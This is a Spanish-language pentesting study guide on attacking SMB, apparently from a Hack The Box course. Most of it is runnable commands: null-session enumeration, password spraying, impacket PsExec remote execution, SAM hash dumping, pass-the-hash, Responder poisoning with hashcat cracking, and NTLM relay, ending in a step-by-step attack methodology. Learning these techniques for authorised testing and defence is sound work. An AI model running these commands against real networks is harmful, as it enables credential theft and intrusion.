
SMB (Server Message Block) permite compartir archivos, impresoras y otros recursos a través de la red.

**Puertos principales:**

- **TCP/445:** SMB directamente sobre TCP/IP.
    
- **TCP/139:** SMB mediante NetBIOS.
    
- **UDP/137-138:** servicios NetBIOS.
    

**Samba** es la implementación de SMB para Linux/Unix.

SMB también puede utilizarse como transporte para **MSRPC**, permitiendo ejecutar procedimientos remotos mediante _named pipes_.

Los principales vectores de ataque son:

- Null Sessions y acceso anónimo.
    
- Enumeración de recursos compartidos, usuarios y grupos.
    
- Password Spraying.
    
- Ejecución remota de comandos.
    
- Extracción de hashes SAM.
    
- Pass-the-Hash.
    
- Captura de hashes NetNTLM mediante Responder.
    
- NTLM Relay.
    

---

## 1. Enumeración SMB

### Nmap

```
nmap -sC -sV -p139,445 <IP>
```

Permite identificar:

- Implementación SMB y posible versión.
    
- Nombre del equipo.
    
- Información del sistema operativo.
    
- Configuración de SMB Signing.
    

Ejemplo:

```
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

smb2-security-mode:
    Message signing enabled but not required
```

**Importante:** si SMB Signing está habilitado pero no es obligatorio, el servidor podría ser vulnerable a determinados ataques de NTLM Relay.

En sistemas Windows, Nmap no siempre identifica correctamente la versión de SMB.

## 2. Null Sessions / Anonymous Login

Una **Null Session** permite conectarse a determinados servicios SMB sin proporcionar credenciales.

Podemos aprovecharla para enumerar:

- Recursos compartidos.
    
- Usuarios y grupos.
    
- Permisos.
    
- Políticas de contraseñas.
    
- Información del dominio.
    

### SMBClient

Listar recursos compartidos sin contraseña:

```
smbclient -N -L //<IP>
```

Conectarse a un recurso compartido:

```
smbclient -N //<IP>/<SHARE>
```

Con credenciales:

```
smbclient //<IP>/<SHARE> -U '<USER>%<PASSWORD>'
```

Comandos dentro de SMBClient:

```
smb: \> ls
smb: \> cd <DIRECTORY>
smb: \> get <FILE>
smb: \> mget *
smb: \> put <FILE>
```

### SMBMap

Enumerar recursos compartidos y permisos:

```
smbmap -H <IP>
```

Ejemplo:

```
Disk       Permissions
ADMIN$     NO ACCESS
C$         NO ACCESS
IPC$       READ ONLY
notes      READ, WRITE
```

Enumerar un recurso:

```
smbmap -H <IP> -r <SHARE>
```

Enumeración recursiva:

```
smbmap -H <IP> -R <SHARE>
```

Descargar archivos:

```
smbmap -H <IP> --download '<SHARE>\<FILE>'
```

Subir archivos:

```
smbmap -H <IP> --upload <LOCAL_FILE> '<SHARE>\<REMOTE_FILE>'
```

**Importante:** buscar recursos con permisos `READ, WRITE`, archivos de configuración, backups y posibles credenciales.

## 3. Enumeración RPC

RPC permite interactuar con determinadas funciones remotas del sistema mediante SMB.

### RPCClient

Conexión mediante Null Session:

```
rpcclient -U '%' <IP>
```

Enumerar usuarios:

```
rpcclient $> enumdomusers
```

Otros comandos útiles:

```
enumdomgroups
querydominfo
querydispinfo
getdompwinfo
enumalsgroups builtin
queryuser <RID>
querygroup <RID>
```

Podemos obtener:

- Usuarios del dominio.
    
- Grupos.
    
- RID de usuarios.
    
- Información del dominio.
    
- Políticas de contraseñas.
    

### Enum4linux-ng

Automatizar la enumeración:

```
enum4linux-ng -A -C <IP>
```

La herramienta recopila información sobre:

- Dominio y Workgroup.
    
- Usuarios.
    
- Grupos.
    
- Sistema operativo.
    
- Recursos compartidos.
    
- Políticas de contraseñas.

## 4. Password Spraying

Cuando no podemos utilizar una Null Session, necesitamos credenciales válidas.

**Password Spraying** consiste en probar una misma contraseña contra múltiples usuarios.

Es preferible a realizar fuerza bruta intensiva sobre una sola cuenta, porque reduce el riesgo de bloqueo.

### CrackMapExec

```
crackmapexec smb <IP> -u users.txt -p 'Company01!'
```

Para cuentas locales:

```
crackmapexec smb <IP> -u users.txt -p 'Company01!' --local-auth
```

Continuar después de encontrar credenciales válidas:

```
crackmapexec smb <IP> -u users.txt -p 'Company01!' --continue-on-success
```

Ejemplo:

```
[+] WIN7BOX\jurena:Company01! (Pwn3d!)
```

**Nota:** `Pwn3d!` indica que la herramienta ha identificado privilegios administrativos.

Los intentos deben ajustarse a la política de bloqueo del entorno.

## 5. Remote Code Execution (RCE)

Si comprometemos una cuenta con privilegios administrativos, podemos ejecutar comandos remotamente mediante SMB.

### Impacket PsExec

```
impacket-psexec '<DOMAIN>/<USER>:<PASSWORD>@<IP>'
```

Ejemplo con administrador local:

```
impacket-psexec 'administrator:Password123!@10.10.110.17'
```

PsExec:

1. Accede a un recurso administrativo como `ADMIN$`.
    
2. Sube un ejecutable de servicio.
    
3. Utiliza RPC para crear e iniciar el servicio.
    
4. Establece una shell remota.
    

En el ejemplo de HTB:

```
C:\Windows\system32> whoami

nt authority\system
```

### Otras herramientas Impacket

**SMBExec:**

```
impacket-smbexec '<USER>:<PASSWORD>@<IP>'
```

**ATExec:**

```
impacket-atexec '<USER>:<PASSWORD>@<IP>' 'whoami'
```

Diferencias:

- **PsExec:** utiliza un servicio remoto y un ejecutable.
    
- **SMBExec:** ejecuta comandos mediante servicios sin utilizar RemComSvc.
    
- **ATExec:** utiliza el Programador de Tareas.
    

### CrackMapExec RCE

Ejecutar comandos CMD:

```
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' -x 'whoami'
```

Ejecutar PowerShell:

```
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' -X 'whoami'
```

Especificar el método de ejecución:

```
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
```

Si no especificamos `--exec-method`, CrackMapExec intentará utilizar `atexec`.

## 6. Enumerar usuarios con sesión iniciada

Con credenciales administrativas podemos identificar usuarios conectados a otros equipos.

```
crackmapexec smb <IP>/24 -u administrator -p 'Password123!' --loggedon-users
```

Ejemplo:

```
WIN7BOX\Administrator
WIN7BOX\jurena
WIN10BOX\demouser
```

Esto puede ayudar a identificar equipos donde existen sesiones de usuarios interesantes.

## 7. Dumping SAM Hashes

La base de datos **SAM (Security Account Manager)** almacena información de las cuentas locales de Windows, incluidos sus hashes de contraseña.

Si tenemos privilegios administrativos, podemos extraerlos remotamente.

### CrackMapExec

```
crackmapexec smb <IP> -u administrator -p '<PASSWORD>' --sam
```

Ejemplo de hash:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

Formato:

```
USERNAME:RID:LM_HASH:NT_HASH:::
```

Los hashes NTLM obtenidos pueden utilizarse para:

- Password Cracking.
    
- Pass-the-Hash.
    
- Comprobar reutilización de credenciales.
    

---

## 8. Pass-the-Hash (PtH)

**Pass-the-Hash** permite autenticarse utilizando directamente un hash NTLM, sin conocer la contraseña original.

### CrackMapExec

```
crackmapexec smb <IP> -u Administrator -H <NT_HASH>
```

Ejemplo:

```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

También podemos utilizar Impacket:

```
impacket-psexec -hashes :<NT_HASH> '<DOMAIN>/<USER>@<IP>'
```

**Importante:** Pass-the-Hash utiliza el hash NTLM de la contraseña, no el hash NetNTLMv2 capturado durante una autenticación de red.

## 9. Captura de hashes con Responder

**Responder** permite realizar ataques de envenenamiento de resolución de nombres mediante:

- LLMNR.
    
- NBT-NS.
    
- mDNS.
    

También puede levantar servicios falsos, incluyendo SMB, para capturar autenticaciones NetNTLMv1/v2.

### Funcionamiento

Cuando Windows intenta resolver un nombre:

1. Consulta el archivo `hosts`.
    
2. Comprueba la caché DNS.
    
3. Consulta el servidor DNS.
    
4. Si falla, puede recurrir a mecanismos como LLMNR o NBT-NS.
    

Responder puede contestar a estas consultas haciéndose pasar por el servidor solicitado.

La víctima intenta autenticarse contra nuestro servidor SMB falso y envía una respuesta de autenticación NetNTLM.

### Ejecutar Responder

```
sudo responder -I <INTERFACE>
```

Ejemplo:

```
sudo responder -I tun0
```

Cuando una víctima intenta acceder a un recurso inexistente, podemos capturar:

```
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:...
```

Los hashes se almacenan en:

```
/usr/share/responder/logs/
```

### Crackear NetNTLMv2

Guardar el hash capturado en `hash.txt`.

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

- `-m 5600`: NetNTLMv2.
    
- `hash.txt`: hash capturado.
    
- `rockyou.txt`: diccionario de contraseñas.
    

**Importante:** diferentes capturas NetNTLMv2 del mismo usuario pueden producir valores distintos debido a los desafíos aleatorios utilizados durante la autenticación.

## 10. NTLM Relay

Si capturamos una autenticación NetNTLM, podemos intentar retransmitirla a otro servidor mediante **NTLM Relay**.

A diferencia de Pass-the-Hash, aquí no reutilizamos directamente un hash NTLM almacenado, sino que retransmitimos una autenticación NTLM en curso.

### Paso 1. Deshabilitar SMB en Responder

Editar:

```
sudo nano /etc/responder/Responder.conf
```

Configurar:

```
SMB = Off
```

Esto permite que `ntlmrelayx` gestione las conexiones SMB entrantes.

### Paso 2. Ejecutar NTLMRelayX

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
```

Parámetros:

- `--no-http-server`: deshabilita el servidor HTTP.
    
- `-smb2support`: habilita compatibilidad con SMB2.
    
- `-t`: servidor al que retransmitiremos la autenticación.
    

### Paso 3. Ejecutar Responder

En otra terminal:

```
sudo responder -I <INTERFACE>
```

Cuando una víctima se autentica contra nuestro servidor, `ntlmrelayx` intenta retransmitir esa autenticación al objetivo.

Ejemplo:

```
Authenticating against smb://10.10.110.146 as /ADMINISTRATOR SUCCEED

Dumping local SAM hashes
```

Si la autenticación retransmitida tiene suficientes privilegios, `ntlmrelayx` puede extraer los hashes SAM.

### Ejecución de comandos mediante NTLM Relay

Podemos especificar un comando con `-c`:

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'whoami'
```

La ejecución requiere que la autenticación retransmitida tenga los privilegios necesarios.

**Importante:** para retransmitir autenticaciones NTLM a SMB, normalmente el servidor de destino no debe exigir SMB Signing.

## 11. RPC

Además de enumerar información, RPC puede permitir modificar elementos del sistema cuando disponemos de los permisos adecuados.

Algunas operaciones posibles son:

- Cambiar contraseñas.
    
- Crear usuarios de dominio.
    
- Crear recursos compartidos.
    

Estas acciones dependen de los permisos del usuario autenticado y de la configuración del servidor.

## 12. Metodología de ataque SMB

### Paso 1. Enumerar SMB

```
nmap -sC -sV -p139,445 <IP>
```

Identificar sistema operativo, implementación SMB y configuración de Signing.

### Paso 2. Probar Null Session

```
smbclient -N -L //<IP>
smbmap -H <IP>
rpcclient -U '%' <IP>
```

### Paso 3. Enumerar recursos compartidos

```
smbmap -H <IP> -R <SHARE>
```

Buscar credenciales, backups, configuraciones y permisos de escritura.

### Paso 4. Enumerar usuarios y grupos

```
enum4linux-ng -A -C <IP>
```

O mediante RPC:

```
rpcclient -U '%' <IP>
```

```
enumdomusers
enumdomgroups
```

### Paso 5. Comprobar credenciales

```
crackmapexec smb <IP> -u users.txt -p '<PASSWORD>'
```

### Paso 6. Comprobar privilegios administrativos

Si obtenemos credenciales válidas:

```
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>'
```

Si tenemos privilegios suficientes, podemos intentar ejecución remota:

```
impacket-psexec '<USER>:<PASSWORD>@<IP>'
```

### Paso 7. Extraer hashes

```
crackmapexec smb <IP> -u <USER> -p '<PASSWORD>' --sam
```

### Paso 8. Pass-the-Hash

Si disponemos de un hash NTLM válido:

```
crackmapexec smb <IP> -u <USER> -H <NT_HASH>
```

### Paso 9. Captura y Relay

Si el escenario permite ataques de resolución de nombres:

```
sudo responder -I <INTERFACE>
```

Para intentar retransmitir autenticaciones:

```
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>
```


## 14. Puntos clave

- **Null Session:** permite enumerar SMB sin credenciales cuando el servidor lo admite.
    
- **SMBMap:** identifica recursos compartidos y sus permisos.
    
- **RPCClient:** permite enumerar usuarios, grupos y otra información del sistema.
    
- **Password Spraying:** prueba contraseñas comunes contra múltiples usuarios.
    
- **PsExec:** permite ejecución remota con privilegios administrativos.
    
- **SAM Dumping:** extrae hashes de cuentas locales.
    
- **Pass-the-Hash:** permite autenticarse utilizando un hash NTLM.
    
- **Responder:** captura autenticaciones NetNTLM mediante envenenamiento de resolución de nombres.
    
- **Hashcat** `**-m 5600**`**:** permite intentar crackear respuestas NetNTLMv2.
    
- **NTLM Relay:** retransmite autenticaciones NTLM hacia otros servidores.
    
- **SMB Signing:** si es obligatorio, impide el relay SMB convencional hacia ese servidor.
